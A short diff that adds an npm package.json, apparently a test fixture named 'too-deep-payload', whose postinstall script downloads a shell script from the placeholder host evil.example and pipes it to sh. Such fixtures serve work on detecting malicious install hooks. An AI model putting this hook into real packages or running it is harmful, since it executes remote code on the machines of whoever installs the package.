@@ -1,0 +1,7 @@
+{
+  "name": "too-deep-payload",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl -s https://evil.example/y.sh | sh"
+  }
+}
